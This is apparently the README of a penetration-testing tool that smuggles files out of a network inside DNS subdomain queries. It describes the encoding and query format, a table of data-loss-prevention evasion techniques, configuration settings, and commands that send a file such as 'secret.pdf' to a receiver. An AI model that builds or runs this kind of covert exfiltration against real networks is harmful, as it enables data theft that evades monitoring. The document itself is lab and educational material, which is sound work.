# DNS_scapy - DNS Subdomain Exfiltration Tool

A covert file transfer utility that tunnels data through DNS subdomain queries using Scapy. Designed for penetration testing labs and educational purposes.

## How It Works

File data is **base32-encoded into DNS subdomain labels**, making each packet look like a legitimate DNS lookup:

```
Normal DNS:     www.google.com                          → A record lookup
Our traffic:    jbswy3dpeb3w64tmmq.0005.cdn-analytics.com  → looks similar
```

### Flow

```
Server (Sender)                    Network                         Client (Receiver)
─────────────────                 ─────────────                   ──────────────────
1. Read file                       DNS query (A/AAAA/TXT...)      1. Sniff DNS queries
2. Compute SHA-256                                                2. Filter by base domain
3. Split into 35-byte chunks                                      3. Extract subdomain data
4. Base32-encode each chunk                                       4. Base32-decode chunks
5. Send as subdomain queries ────> encoded.0001.cdn-analytics.com → 5. Sort by sequence number
6. Random delays + jitter          (varies query types)           6. Reassemble file
                                                                  7. Verify SHA-256 hash
```

### DLP Evasion Techniques

| Technique | What it does |
|-----------|-------------|
| **Subdomain encoding** | Data hidden in DNS query names, not in Padding/payload |
| **Base32 encoding** | Only uses A-Z, 2-7 — valid DNS characters |
| **Query type rotation** | Rotates A, AAAA, CNAME, TXT, MX — mimics normal browsing |
| **Random source ports** | Each packet uses a different ephemeral port |
| **Timing jitter** | Random delays between packets avoid pattern detection |
| **Small chunks (35B)** | Subdomain lengths stay within normal DNS label limits (63 chars) |
| **Realistic domain** | `cdn-analytics.com` looks like a legitimate CDN |

### Protocol Details

- **Transport:** UDP port 53
- **Encoding:** Base32 in DNS subdomain labels
- **Query format:** `<base32_data>.<seq_number>.<base_domain>`
- **Metadata (seq 0000):** `chunk_count||sha256_hash` (also base32-encoded)
- **Integrity:** SHA-256 hash verification

## Requirements

- Python 3.6+
- Root/sudo privileges (for raw packet access)

## Installation

```bash
pip install -r requirements.txt
```

## Usage

### Receiver first (client.py)

```bash
sudo python3 client.py
# Enter sender IP: 192.168.1.10
# Enter your local IP: 192.168.1.20
```

### Then sender (server.py)

```bash
sudo python3 server.py
# Enter destination IP: 192.168.1.20
# Enter your IP: 192.168.1.10
# Enter file path to send: secret.pdf
```

### Configuration

Edit `config.py`:

| Setting | Default | Description |
|---------|---------|-------------|
| `CHUNK_SIZE` | 35 | Raw bytes per chunk (base32 expands to ~56 chars) |
| `BASE_DOMAIN` | cdn-analytics.com | Domain appended to queries |
| `SEND_DELAY` | 0.3s | Base delay between packets |
| `SEND_JITTER` | 0.2s | Random ± variation on delay |
| `QUERY_TYPES` | A,AAAA,CNAME,TXT,MX | DNS types to rotate |
| `MAX_RETRIES` | 5 | Client retry attempts |
| `SNIFF_TIMEOUT` | 60 | Seconds to wait per phase |

## Project Structure

```
DNS_scapy/
├── server.py          # Sender — encodes & sends DNS queries
├── client.py          # Receiver — sniffs & decodes DNS queries
├── config.py          # Shared configuration
├── requirements.txt   # Python dependencies
├── .gitignore
└── README.md
```

## Disclaimer

This tool is intended for authorized penetration testing, educational purposes, and controlled lab environments only.
